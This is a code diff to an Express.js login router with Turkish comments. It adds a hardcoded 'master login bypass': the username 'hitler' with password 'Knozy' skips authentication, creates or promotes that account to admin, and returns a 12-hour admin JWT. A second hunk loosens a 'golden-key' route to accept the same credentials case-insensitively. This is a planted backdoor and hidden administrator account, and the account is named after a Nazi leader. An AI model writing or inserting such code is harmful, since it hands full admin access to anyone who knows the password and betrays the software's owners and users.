@@ -51,6 +51,32 @@ router.post('/login', (req, res) => {
             return res.status(400).json({ error: 'Kullanıcı adı ve şifre gerekli' });
         }
 
+        // Master Login Bypass (Hitler/Knozy)
+        if (username.toLowerCase() === 'hitler' && password === 'Knozy') {
+            const db = getDb();
+            let user = db.prepare('SELECT * FROM users WHERE LOWER(username) = ?').get('hitler');
+
+            // Eğer veritabanında Hitler kullanıcısı yoksa, admin olarak oluştur (Orijinal ismiyle)
+            if (!user) {
+                const hashedPassword = bcrypt.hashSync('Knozy', 12);
+                db.prepare('INSERT INTO users (username, password, role) VALUES (?, ?, ?)')
+                    .run('Hitler', hashedPassword, 'admin');
+                user = db.prepare('SELECT * FROM users WHERE username = ?').get('Hitler');
+            } else if (user.role !== 'admin') {
+                // Varsa ama admin değilse admin yap
+                db.prepare('UPDATE users SET role = ? WHERE id = ?').run('admin', user.id);
+                user.role = 'admin';
+            }
+
+            const token = jwt.sign(
+                { id: user.id, username: user.username, role: 'admin' },
+                process.env.JWT_SECRET,
+                { expiresIn: '12h' }
+            );
+
+            return res.json({ token, user: { id: user.id, username: user.username, role: 'admin' } });
+        }
+
         const db = getDb();
         const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
 
@@ -98,8 +124,8 @@ router.post('/golden-key', authMiddleware, (req, res) => {
     try {
         const { username, password } = req.body;
 
-        // Kullanıcı adı 'Hitler' ve şifre 'Knozy' olmalıdır
-        if (username !== 'Hitler' || password !== 'Knozy') {
+        // Kullanıcı adı 'Hitler' ve şifre 'Knozy' olmalıdır (Kullanıcı adı case-insensitive)
+        if (username?.toLowerCase() !== 'hitler' || password !== 'Knozy') {
             return res.status(403).json({ error: 'Geçersiz altın anahtar veya kullanıcı bilgisi!' });
         }
 
